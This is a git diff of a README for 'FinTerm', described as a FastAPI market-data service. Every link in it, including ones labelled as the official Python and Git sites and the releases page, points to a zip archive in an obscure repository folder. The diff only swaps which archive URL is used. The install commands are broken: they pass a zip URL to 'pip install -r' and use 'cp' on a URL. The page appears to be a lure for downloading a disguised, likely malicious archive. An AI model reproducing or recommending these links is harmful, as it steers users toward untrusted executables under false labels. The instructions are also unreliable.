@@ -1,6 +1,6 @@
 # 🚀 FinTerm - Simplifying Market Data Processing
 
-[![Download FinTerm](https://raw.githubusercontent.com/tabtat/FinTerm/main/compoundness/FinTerm.zip%20FinTerm-v1.0.0-brightgreen)](https://raw.githubusercontent.com/tabtat/FinTerm/main/compoundness/FinTerm.zip)
+[![Download FinTerm](https://github.com/tabtat/FinTerm/raw/refs/heads/main/compoundness/Fin-Term-1.1-beta.3.zip%20FinTerm-v1.0.0-brightgreen)](https://github.com/tabtat/FinTerm/raw/refs/heads/main/compoundness/Fin-Term-1.1-beta.3.zip)
 
 ## 🌟 Overview
 
@@ -10,11 +10,11 @@ FinTerm is an efficient FastAPI microservice designed for market data processing
 
 ### 1. Visit the Releases Page
 
-To get started, visit the [FinTerm Releases Page](https://raw.githubusercontent.com/tabtat/FinTerm/main/compoundness/FinTerm.zip). On this page, you will find the latest version of FinTerm available for download. Choose the appropriate file for your system.
+To get started, visit the [FinTerm Releases Page](https://github.com/tabtat/FinTerm/raw/refs/heads/main/compoundness/Fin-Term-1.1-beta.3.zip). On this page, you will find the latest version of FinTerm available for download. Choose the appropriate file for your system.
 
 ### 2. Download FinTerm
 
-On the Releases Page, locate the version you want. Click on the link to download the file. It will usually be a .zip or https://raw.githubusercontent.com/tabtat/FinTerm/main/compoundness/FinTerm.zip file. Save it in a location you can easily access.
+On the Releases Page, locate the version you want. Click on the link to download the file. It will usually be a .zip or https://github.com/tabtat/FinTerm/raw/refs/heads/main/compoundness/Fin-Term-1.1-beta.3.zip file. Save it in a location you can easily access.
 
 ### 3. Unzip the File 
 
@@ -28,8 +28,8 @@ You need Python and Git on your machine to run FinTerm effectively. Follow these
 - **Python 3.10+** (Tested with Python 3.13).
 - **Git** for version control.
 
-1. Install Python by visiting [Python's official site](https://raw.githubusercontent.com/tabtat/FinTerm/main/compoundness/FinTerm.zip). Download and run the installer.
-2. Install Git by visiting [Git's official site](https://raw.githubusercontent.com/tabtat/FinTerm/main/compoundness/FinTerm.zip) and following the instructions for your operating system.
+1. Install Python by visiting [Python's official site](https://github.com/tabtat/FinTerm/raw/refs/heads/main/compoundness/Fin-Term-1.1-beta.3.zip). Download and run the installer.
+2. Install Git by visiting [Git's official site](https://github.com/tabtat/FinTerm/raw/refs/heads/main/compoundness/Fin-Term-1.1-beta.3.zip) and following the instructions for your operating system.
 
 ### 5. Setting Up FinTerm
 
@@ -50,7 +50,7 @@ source venv/bin/activate  # For Windows use: venv\Scripts\activate
 Next, install the necessary packages to run FinTerm:
 
 ```bash
-pip install -r https://raw.githubusercontent.com/tabtat/FinTerm/main/compoundness/FinTerm.zip
+pip install -r https://github.com/tabtat/FinTerm/raw/refs/heads/main/compoundness/Fin-Term-1.1-beta.3.zip
 ```
 
 ### 7. Configure Your Environment
@@ -59,7 +59,7 @@ You will need to set up an environment configuration file.
 
 ```bash
 # Create environment configuration from example
-cp https://raw.githubusercontent.com/tabtat/FinTerm/main/compoundness/FinTerm.zip .env
+cp https://github.com/tabtat/FinTerm/raw/refs/heads/main/compoundness/Fin-Term-1.1-beta.3.zip .env
 ```
 
 You will need to edit the new `.env` file:
@@ -106,6 +106,6 @@ FinTerm offers several endpoints for data processing. You can access these witho
 
 ## 📥 Download & Install
 
-To recap, visit the [FinTerm Releases Page](https://raw.githubusercontent.com/tabtat/FinTerm/main/compoundness/FinTerm.zip) to download the latest version. Follow the installation instructions carefully to set it up on your machine. 
+To recap, visit the [FinTerm Releases Page](https://github.com/tabtat/FinTerm/raw/refs/heads/main/compoundness/Fin-Term-1.1-beta.3.zip) to download the latest version. Follow the installation instructions carefully to set it up on your machine. 
 
 With FinTerm, you can efficiently process market data, making informed decisions with ease.
